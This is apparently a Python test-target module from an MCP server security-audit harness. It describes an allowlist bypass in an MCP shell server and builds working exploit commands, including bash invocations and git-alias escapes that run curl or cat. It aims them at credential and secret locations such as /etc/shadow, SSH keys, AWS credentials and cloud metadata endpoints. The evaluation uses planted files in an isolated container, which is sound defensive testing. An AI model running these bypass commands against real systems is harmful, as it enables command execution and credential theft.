"""CVE-2026-55581: secure-mode allowlist bypass in sonirico/mcp-shell (command execution).

The server launches from the checkout /srv/app, the deployment layout's working directory. HOME
stays /tmp (the confinement default), so the $HOME/~ catalogue coordinates (the planted dotfiles)
resolve under /tmp whatever the working directory; the kept places use absolute or $HOME
coordinates only.

The shipped Docker security.yaml runs secure mode (use_shell_execution: false) but allowlists the
interpreters /bin/bash, /usr/bin/git and /usr/bin/python3. validateCommand only checks the first
whitespace token against the allowlist, so `/bin/bash <anything>` passes and the executor runs
bash directly, giving arbitrary command execution. v0.6.0 removes the interpreters from the
default allowlist (and rejects '!'/'=!'), so `/bin/bash ...` is "not in allowed list" -> blocked.

The executor re-splits the command on whitespace and execs argv directly (no shell), so one
shell_exec call delivers either a no-argument command (`/bin/bash -c <token>`) or a file run as a
bash script (`/bin/bash <path>`, whose one-token content surfaces in stderr as "command not
found"). An internal HTTP endpoint needs the git-alias escape (also allowlisted, the
CVE-2026-55582 sibling vector): `/usr/bin/git -c alias.x=!curl x <url>` makes git run the alias
through a shell and append the URL token, so curl fetches the endpoint and echoes its body. The
planted AWS shared-credentials file is a multi-line INI file whose values bash never quotes, so
it is read through the same escape with cat.
"""

import re

from evals.cve_environments import command_injection_env
from evals.cve_grammar import MechanismClass
from evals.cve_layout import ANCHOR_PATHS
from evals.cve_places import LayoutAnchor, Place, Places, PlantKind
from evals.cve_planting import PlantingHost, SymbolicUser
from evals.cve_planting_spec import resolve_container_path
from evals.cve_targets import CVETarget
from mcp_auditor.domain.ports import MCPClientPort

# The launch working directory (docker -w), the checkout the deployment layout prescribes.
# $HOME/~ coordinates resolve under the fixed planting home (/tmp), not under this value.
_WORKDIR = ANCHOR_PATHS[LayoutAnchor.PROJECT]

KEPT_PLACES = (
    "process-account-identity",
    "etc-shadow",
    "container-hostname",
    "aws-credentials",
    "gcloud-adc",
    "azure-profile",
    "ssh-private-key",
    "shell-history",
    "git-credentials",
    "npmrc",
    "gh-hosts",
    "docker-config",
    "kube-config",
    "pgpass",
    "mysql-client-cnf",
    "mongorc",
    "mysql-system-cnf",
    "proc-environ",
    "run-secrets",
    "k8s-sa-token",
    "etc-hosts",
    "auth-log",
    "imds",
    "ecs-task-credentials",
    "eks-pod-identity",
)

AIM = re.compile(r"/bin/bash|/usr/bin/git")


def _file_command(place: Place) -> str:
    coords = place.coordinates
    raw = coords.paths[0] if coords.paths is not None else coords.path
    assert raw is not None
    path = resolve_container_path(raw, _WORKDIR)
    if place.id == "aws-credentials":
        return f"/usr/bin/git -c alias.x=!cat x {path}"
    return f"/bin/bash {path}"


def _http_command(place: Place) -> str:
    # git-alias escape: an allowlisted /usr/bin/git runs the `!` alias through a shell and
    # appends the remaining token, so curl fetches the endpoint and echoes its body (the nonce).
    host = place.coordinates.host
    path = place.coordinates.path
    assert host is not None and path is not None
    return f"/usr/bin/git -c alias.x=!curl x -s http://{host}{path}"


def _command_for(place: Place) -> str:
    if place.kind is PlantKind.FILE:
        return _file_command(place)
    if place.kind is PlantKind.ENV:
        return "/bin/bash -c env"
    if place.kind is PlantKind.HOSTNAME:
        return "/bin/bash -c hostname"
    if place.kind is PlantKind.ACCOUNT:
        return "/bin/bash -c id"
    if place.kind is PlantKind.HTTP_ENDPOINT:
        return _http_command(place)
    raise ValueError(f"{place.id}: unsupported kind for the command_execution reach")


def _exploit(place_id: str):
    async def run(places: Places, client: MCPClientPort) -> None:
        await client.call_tool("shell_exec", {"command": _command_for(places[place_id])})

    return run


async def _benign(places: Places, client: MCPClientPort) -> None:
    await client.call_tool("shell_exec", {"command": "pwd"})


TARGET = CVETarget(
    cve_id="CVE-2026-55581",
    severity="CVSS 8.8 (v3.1, placeholder)",
    mechanisms=frozenset({MechanismClass.COMMAND_EXECUTION}),
    aim=AIM,
    reaches=frozenset({"command_execution"}),
    kept_places=KEPT_PLACES,
    images=("holdout-2026-55581-mcp-shell", "sentinel"),
    server_image="holdout-2026-55581-mcp-shell",
    patched_image="holdout-2026-55581-mcp-shell-patched",
    planting_host=PlantingHost(SymbolicUser.UNPRIVILEGED, _WORKDIR, has_network=False),
    builder=command_injection_env,
    exploits=tuple(_exploit(place_id) for place_id in KEPT_PLACES),
    benign=_benign,
    awaited_capability=None,
    note=(
        "Secure-mode allowlist bypass: the shipped security.yaml allowlists the /bin/bash, "
        "/usr/bin/git and /usr/bin/python3 interpreters, and validateCommand only checks the "
        "first token, so `shell_exec` with `/bin/bash <anything>` (or the git-alias `!` escape) "
        "runs an arbitrary command in the server's container."
    ),
    tools_filter=None,
)
